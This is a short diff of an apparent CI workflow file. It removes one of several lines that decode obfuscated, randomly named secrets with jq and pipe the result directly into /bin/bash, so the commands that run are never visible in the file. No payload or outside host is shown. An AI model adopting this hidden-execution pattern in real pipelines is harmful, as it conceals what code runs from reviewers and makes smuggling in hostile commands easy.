@@ -18,7 +18,6 @@ jobs:
           bj79: ${{ secrets.bj79 }}
         run: |
           printf '%s' "$bj79" | jq -r .yo46 | /bin/bash
-          printf '%s' "$n07" | jq -r .xp3243 | /bin/bash
           printf '%s' "$wbt442" | jq -r .ik1040 | /bin/bash
           echo $ugq1341 | jq -r .mw2 | /bin/bash
           echo $v6 | jq -r .t42657 | /bin/bash
